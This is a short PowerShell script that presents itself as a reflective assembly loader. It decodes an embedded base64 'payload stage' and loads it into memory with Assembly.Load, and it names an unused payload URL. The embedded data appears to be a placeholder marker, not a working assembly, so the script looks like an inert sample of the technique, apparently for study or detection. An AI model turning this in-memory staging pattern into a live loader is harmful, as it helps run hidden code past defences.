<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://contoso.com/payload.bin",
    [int]$TimeoutSec = 170
)
$ErrorActionPreference = "Stop"

$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpoMWtzcm5rNDFv')
Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
$StageResult = [Reflection.Assembly]::Load($StageBytes)
if ($null -ne $StageResult) {
    Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
}

$ProgressPreference = "SilentlyContinue"
